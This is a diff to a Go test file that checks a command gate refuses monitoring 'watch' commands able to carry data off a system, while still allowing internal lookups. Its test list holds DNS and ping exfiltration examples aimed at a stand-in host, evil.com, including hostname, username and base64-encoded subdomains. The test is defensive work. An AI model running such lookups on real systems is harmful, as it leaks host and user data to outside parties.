@@ -61,7 +61,47 @@ func TestAStoredRiskyWatchIsRetiredNotRun(t *testing.T) {
 	if !app.DB.Get(watchTable, w.ID, &got) || !got.Done {
 		t.Fatal("a watch the gate refuses was left live, to be tried again every minute")
 	}
-	if why := watchRunRefusal("systemctl is-active web"); why != "" {
+	if why := watchRunRefusal(Appliance{ID: "a1"}, "systemctl is-active web"); why != "" {
 		t.Errorf("a read-only watch is refused at run time: %s", why)
+	}
+}
+
+// A watch is classified before its allowlist is checked, so a lookup that can
+// carry data off the system, or goes outside the system's lookup destinations,
+// is refused at registration and at every tick, the same as it asks at the
+// prompt. A lookup inside them still watches.
+func TestAWatchRefusesALookupThatCarriesData(t *testing.T) {
+	sys := Appliance{ID: "a1", Host: "web01.corp.example.com", LookupAllow: []string{"203.0.113.0/24"}}
+	pr := &probeRun{appliance: sys, userID: "u"}
+	pr.reportTools()
+	for _, cmd := range []string{
+		"ping -c1 -p deadbeef 10.0.0.1",
+		"dig $HOSTNAME.evil.com",
+		"host ${USER}.evil.com",
+		"nslookup < /tmp/names",
+		"dig +short c2VjcmV0.evil.com",
+	} {
+		if why := watchRunRefusal(sys, cmd); !strings.Contains(why, string(RiskNetEgress)) {
+			t.Errorf("%q would run as a watch: %q", cmd, why)
+		}
+		func() {
+			// Past both checks, registration needs a store this run lacks.
+			defer func() {
+				if recover() != nil {
+					t.Errorf("%q got past both checks to registration", cmd)
+				}
+			}()
+			_, err := pr.watch_condition_tool.Handler(context.Background(), map[string]any{
+				"task": "t", "command": cmd, "success_pattern": "ok",
+			})
+			if err == nil || !strings.Contains(err.Error(), string(RiskNetEgress)) {
+				t.Errorf("%q was not refused as egress at registration: %v", cmd, err)
+			}
+		}()
+	}
+	for _, cmd := range []string{"dig +short db01.corp.example.com", "ping -c1 10.0.0.1", "ping -c1 203.0.113.9"} {
+		if why := watchRunRefusal(sys, cmd); why != "" {
+			t.Errorf("%q is refused as a watch: %s", cmd, why)
+		}
 	}
 }
